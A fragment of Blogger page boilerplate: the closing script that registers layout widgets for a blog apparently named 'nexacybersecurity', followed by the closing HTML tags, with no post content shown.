_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'header', document.getElementById('Header1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'main', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/599103511-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/1964470060-lightbox_bundle.css'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_ProfileView', new _WidgetInfo('Profile1', 'sidebar-right-1', document.getElementById('Profile1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogSearchView', new _WidgetInfo('BlogSearch1', 'sidebar-right-1', document.getElementById('BlogSearch1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive2', 'sidebar-right-1', document.getElementById('BlogArchive2'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive1', 'sidebar-right-2-1', document.getElementById('BlogArchive1'), {'languageDirection': 'ltr', 'loadingMessage': 'Loading\x26hellip;'}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label1', 'sidebar-right-2-2', document.getElementById('Label1'), {}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_PageListView', new _WidgetInfo('PageList1', 'sidebar-right-3', document.getElementById('PageList1'), {'title': '', 'links': [{'isCurrentPage': false, 'href': 'https://nexacybersecurity.blogspot.com/', 'title': 'Home'}], 'mobile': false, 'showPlaceholder': true, 'hasCurrentPage': false}, 'displayModeFull'));
_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'footer-3', document.getElementById('Attribution1'), {}, 'displayModeFull'));
</script>
</body>
</html>